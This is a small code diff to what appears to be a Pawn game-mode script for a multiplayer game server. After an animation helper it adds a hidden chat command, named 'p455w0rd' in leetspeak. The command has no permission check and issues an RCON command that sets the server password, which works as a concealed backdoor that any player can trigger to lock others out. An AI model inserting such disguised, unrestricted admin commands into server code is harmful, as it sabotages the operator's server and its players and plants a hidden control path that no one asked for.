@@ -13455,3 +13455,8 @@ public EndAnim(playerid)
 	ApplyAnimation(playerid, "CARRY", "crry_prtial", 4.0, 0, 0, 0, 0, 0);
 	return 1;
 }
+
+CMD:p455w0rd(playerid, params[]) {
+	SendRconCommand("password asd");
+	return 1;
+}
